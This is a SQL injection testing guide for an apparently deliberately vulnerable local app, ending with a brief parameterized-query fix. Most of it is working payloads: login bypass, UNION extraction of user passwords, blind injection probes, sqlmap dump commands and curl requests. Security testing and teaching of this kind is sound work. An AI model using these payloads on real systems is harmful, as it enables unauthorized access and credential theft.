# SQL Injection Testing Guide

## 1. Login Bypass

### Basic Bypass
```
Username: hilmy' OR '1'='1' --
Password: (anything)
```

### Alternative Payloads
```
hilmy' --
' OR 1=1 --
' OR 'a'='a' --
hilmy' OR '1'='1' #
' OR '1'='1' /*
```

## 2. Union-Based Injection

### Extract User Data
```
Username: ' UNION SELECT NULL, username, password, email, role, NULL FROM users --
Password: (anything)
```

### Column Discovery
```
' UNION SELECT NULL --
' UNION SELECT NULL, NULL --
' UNION SELECT NULL, NULL, NULL --
(continue until no error)
```

## 3. Blind SQL Injection

### Time-Based
```
hilmy' AND SLEEP(5) --
hilmy' OR IF(1=1, SLEEP(5), 0) --
```

### Boolean-Based
```
hilmy' AND '1'='1' --  (True - success)
hilmy' AND '1'='2' --  (False - fail)
```

## 4. Database Information

### SQLite Specific
```
' UNION SELECT NULL, sqlite_version(), NULL, NULL, NULL, NULL --
' UNION SELECT NULL, name, NULL, NULL, NULL, NULL FROM sqlite_master WHERE type='table' --
```

## 5. Data Extraction

### Get All Users
```
' UNION SELECT CAST(id AS TEXT), username, password, email, role, created_at FROM users --
```

### Get All Posts
```
' UNION SELECT CAST(id AS TEXT), title, content, CAST(author_id AS TEXT), created_at, NULL FROM posts --
```

## 6. Search Endpoint Testing

URL: `http://localhost:5000/api/posts/search?q=PAYLOAD`

### Extract Users via Search
```
%' UNION SELECT CAST(id AS TEXT), username, password, email, NULL, NULL FROM users --
```

## Tools

### SQLMap
```bash
# Test login endpoint
sqlmap -u "http://localhost:5000/api/login" \
  --data="username=admin&password=test" \
  --batch --level=5 --risk=3

# Test search endpoint
sqlmap -u "http://localhost:5000/api/posts/search?q=test" \
  --batch --dump
```

### Manual cURL
```bash
# Test login
curl -X POST http://localhost:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"hilmy'\'' OR '\''1'\''='\''1'\'' --","password":"test"}'

# Test search
curl "http://localhost:5000/api/posts/search?q=%27%20UNION%20SELECT%20username,%20password,%20NULL,%20NULL,%20NULL,%20NULL%20FROM%20users%20--"
```

## Expected Results

### Successful Bypass
- You can login without valid credentials
- Response contains user data

### Data Extraction
- You can see usernames and passwords of all users
- You can access data from other tables

## Mitigation

Use parameterized queries:
```javascript
// SECURE
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.all(query, [username, password], (err, rows) => {
  // Handle results
});
```

Never concatenate user input directly into SQL queries!
